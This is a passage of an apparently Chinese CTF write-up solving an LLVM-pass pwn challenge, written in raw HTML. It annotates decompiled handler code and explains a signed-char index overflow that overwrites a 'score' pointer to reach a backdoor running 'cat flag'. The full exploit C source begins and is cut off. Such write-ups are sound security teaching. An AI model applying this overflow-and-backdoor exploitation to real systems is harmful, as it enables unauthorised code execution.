class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数需要有<code>2</code>个参数，分别为<code>v50</code>和<code>v49</code>，最后进行<code>weaponlist[v50] += weaponlist[v49]</code>操作<br>下面几个函数比较容易看懂且用处不大，就不做分析<br>对<code>destroy</code>函数的处理：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;destroy&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  v47 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v47 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v17 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v46 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">  v48 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v46);</span><br><span class="line">  weaponlist[v48] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对<code>upgrade</code>函数的处理：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;upgrade&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v45 = <span class="number">0</span>;</span><br><span class="line">  v44 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v44 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v18 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v43 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v18);</span><br><span class="line">  v45 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v43);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k )</span><br><span class="line">    weaponlist[k] += v45;</span><br><span class="line">  v19 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;upgrade finish&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v19, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v20 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;enjoy your war&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是一系列关于原神梗的函数（原神<code>56</code>级玩家）：  </p><img src="/2024/03/15/llvm/9.png" class="" title="我的图图呢">  <p>可以看出这一系列函数允许我们对<code>cmd</code>这个全局变量进行操作，所以我们可以通过对这几个函数的顺序进行适当的排序即可令<code>cmd</code>为我们想要的值<br>我们可以通过下面这段代码将<code>cmd</code>的值设置为<code>&quot;cat flag&quot;</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tiandongwanxiang</span>();</span><br><span class="line"><span class="built_in">wuxiangdeyidao</span>();</span><br><span class="line"><span class="built_in">guobapenhuo</span>();</span><br><span class="line"><span class="built_in">wuxiangdeyidao</span>();</span><br></pre></td></tr></table></figure><p>效果如下：  </p><img src="/2024/03/15/llvm/10.png" class="" title="我的图图呢">  <p>接下来是最重要的部分，当函数的名字不满足上述的所有条件后才会执行以下这段代码：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  v36 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);<span class="comment">// 获取函数的参数个数</span></span><br><span class="line">  <span class="keyword">if</span> ( v36 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v21 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v35 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">  v37 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v35);<span class="comment">// 获取函数的第一个参数</span></span><br><span class="line">  v34 = std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">begin</span>(&amp;funMap[abi:cxx11]);<span class="comment">// v34为map的迭代器，指向begin</span></span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;                                 <span class="comment">// _Rb_tree_iterator为红黑树迭代器，map的底层即为红黑树</span></span><br><span class="line">    v32 = std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">end</span>(&amp;funMap[abi:cxx11]);</span><br><span class="line">    <span class="keyword">if</span> ( (std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>!=(&amp;v34, &amp;v32) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;                        <span class="comment">// 如果迭代器到达map的尾端着退出循环</span></span><br><span class="line">    v22 = std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>-&gt;(&amp;v34);<span class="comment">// </span></span><br><span class="line">                                    <span class="comment">// 将v34这个std::pair&lt;std::string const,unsigned char&gt;类型对象赋值给v22</span></span><br><span class="line">    <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v22, v58) &amp; <span class="number">1</span>) != <span class="number">0</span> )<span class="comment">// v58为函数名</span></span><br><span class="line">    &#123;                               <span class="comment">// map中存在该函数名</span></span><br><span class="line">      v23 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">              &amp;std::cout,</span><br><span class="line">              <span class="string">&quot;you really want this?all right,i will add it into the weapon list&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v23, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      v24 = std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>-&gt;(&amp;v34);</span><br><span class="line">      weaponlist[v33] = *(_BYTE *)(v24 + <span class="number">0x20</span>);<span class="comment">// 将value赋值给weaponlist，漏洞出现的地方</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v33;                          <span class="comment">// 用于记录map中已经存在的函数个数</span></span><br><span class="line">    v31[<span class="number">1</span>] = std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>++(&amp;v34, <span class="number">0LL</span>);</span><br><span class="line">    <span class="comment">// 将v34迭代器向前推进一个位置</span></span><br><span class="line">  &#125;</span><br><span class="line">  v31[<span class="number">0</span>] = std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">end</span>(&amp;funMap[abi:cxx11]);</span><br><span class="line">  <span class="keyword">if</span> ( (std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>==(&amp;v34, v31) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;                                 <span class="comment">// 当前函数不存在map中，输出</span></span><br><span class="line">    v25 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;wow!! you find a new weapon&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v25, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = v37;</span><br><span class="line">  v29[<span class="number">0</span>] = llvm::Value::<span class="built_in">getName</span>(CalledFunction);<span class="comment">// 获取函数名</span></span><br><span class="line">  v29[<span class="number">1</span>] = v26;                     <span class="comment">// 处理函数的参数</span></span><br><span class="line">  llvm::<span class="function">StringRef::<span class="keyword">operator</span> <span class="title">std::string</span><span class="params">(v30, v29)</span></span>;<span class="comment">// 将v29转换为StringRef类型对象后存储在v30中</span></span><br><span class="line">  *(_BYTE *)std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="keyword">operator</span>[](&amp;funMap[abi:cxx11], v30) = v28;<span class="comment">// 将该函数插入map中</span></span><br><span class="line">  std::string::~<span class="built_in">string</span>(v30);</span><br><span class="line">&#125;</span><br><span class="line">std::string::~<span class="built_in">string</span>(v58);</span><br></pre></td></tr></table></figure><p>由于比较重要，所以代码中写了很多注释，下面就只讲讲几个比较重要的点：<br>代码中遍历的时候是按照函数名大小遍历的，所以我们在利用该段代码的时候要注意函数的命名<br>漏洞出现在<code>weaponlist[v33] = *(_BYTE *)(v24 + 0x20);</code>这一段代码<br>该<code>weaponlist</code>数组是通过<code>char</code>类型的<code>v33</code>进行索引的，而有符号<code>char</code>类型的范围是<code>-128 ~ +127</code>，也就是说，当<code>v33</code>的值为<code>127</code>时，此时加<code>1</code>，<code>v33</code>的值会变成<code>-128</code>而不是<code>128</code>，所以我们可以利用这个点来造成数组后溢来修改后面的值<br>在<code>weaponlist</code>数组后存在的数据：  </p><img src="/2024/03/15/llvm/11.png" class="" title="我的图图呢">  <p>可以看见<code>score</code>指针就在其后面，如果我们可以利用数组后溢来改写<code>score</code>指针指向一个很大的值的地址，那么我们在使用<code>fight</code>函数时就可以满足<code>backdoor</code>函数的调用条件从而进入<code>backdoor</code>函数，而<code>cmd</code>已经在前面被我们改写成<code>&quot;cat flag&quot;</code>，所以进入<code>backdoor</code>函数后我们即可获得<code>flag</code><br>完整<code>exp</code>如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -emit-llvm -S exp.c -o exp.ll</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">wuxiangdeyidao</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">guobapenhuo</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">tiandongwanxiang</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fight</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux000</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux001</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux002</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux003</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux004</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux005</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux006</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux007</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux008</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux009</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux010</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux011</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux012</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux013</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux014</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux015</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux016</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux017</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux018</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux019</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux020</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux021</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux022</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux023</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux024</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux025</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux026</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux027</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux028</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux029</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux030</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux031</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux032</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux033</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux034</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux035</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux036</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux037</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux038</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux039</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux040</span><span class="params">(<span 